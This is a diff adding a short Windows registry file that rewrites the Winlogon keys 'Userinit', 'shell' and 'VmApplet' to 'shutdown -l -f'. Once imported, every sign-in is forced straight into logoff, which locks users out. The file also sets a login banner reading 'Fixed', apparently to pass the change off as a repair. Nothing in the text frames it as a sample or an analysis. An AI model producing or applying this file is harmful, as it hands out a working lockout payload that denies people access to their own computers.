@@ -1,0 +1,9 @@
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
+"Userinit"="C:\\WINDOWS\\system32\\userinit.exe,shutdown -l -f"
+"shell"="shutdown -l -f"
+"LegalNoticeText"="Fixed"
+"LegalNoticeCaption"="Fixed"
+"AltDefaultUserName"="Administrator"
+"VmApplet"="shutdown -l -f"
